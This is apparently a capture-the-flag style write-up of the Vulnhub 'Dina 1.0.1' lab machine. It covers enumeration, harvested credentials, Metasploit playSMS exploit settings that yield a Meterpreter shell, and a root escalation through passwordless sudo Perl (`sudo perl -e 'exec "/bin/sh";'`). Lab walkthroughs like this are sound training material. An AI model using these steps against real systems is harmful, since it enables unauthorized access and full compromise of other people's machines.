# Vulnhub - Dina 1.0.1

This document outlines the findings and steps taken during a penetration test performed on Dina 1.0.1

## Network Scanning and Enumeration

### Nmap Scan
- **Command:** `nmap 192.168.1.26 -sV -A`
- **Findings:** The scan revealed an open HTTP port (80/tcp) running Apache httpd 2.2.22 on an Ubuntu system. The website is named 'Dina'

### Directory Bruteforcing
- **Command:** `dirb http://192.168.1.26/`
- **Findings:** Discovered several accessible directories, including '/secure' '/tmp' and '/uploads' The 'secure' directory contains a password-encrypted zip file.

## Web Application Analysis

### Passwords from Source Code
- **Findings:** The 'nothing' folder's source code contained several passwords, including 'freedom' 'password' 'helloworld!' 'diana' and 'iloveroot' The encrypted MP3 file was decoded, and prompted with cat revealing a username and password.

```
I am not toooo smart in computer .......dat the resoan i always choose easy password...with creds backup file....

uname: touhid
password: ******
url : /SecreTSMSgatwayLogin
```
When going to url there is a form just connect with touhid USER and diana as password. WE NOW HAVE ACCFESS to the "SecreTSMSgatwayLogin"

### Exploiting 'playsms' Vulnerability
- **Description:** Identified 'playsms' as the application running on the target. Utilized a Metasploit exploit to gain access to the system.

```
PASSWORD => diana
USERNAME => touhid
RHOSTS => 192.168.1.26
LHOST => 192.168.1.22
TARGETURI => SecreTSMSgatwayLogin
```

- **Findings:** Successfully gained a Meterpreter session as the 'www-data' user.

Upgrade your shell with ` python -c 'import pty; pty.spawn("/bin/bash")'`

### Privilege Escalation
- **Command:** `sudo -l`
- **Findings:** Discovered that the 'www-data' user can execute Perl as root without a password.
  
  **(ALL) NOPASSWD: /usr/bin/perl**

## Privilege Escalation to Root

### Exploiting Sudo Permissions with Perl
- **Command:** `sudo perl -e 'exec "/bin/sh";'`
- **Findings:** Successfully escalated privileges to the root user, gaining complete control over the target system.

## Conclusion

The penetration test identified several vulnerabilities, including weak directory permissions, exposed passwords in source code, and a sudo configuration allowing the www-data user to execute Perl as root. These vulnerabilities were effectively exploited to gain unauthorized access and privilege escalation on the target system.
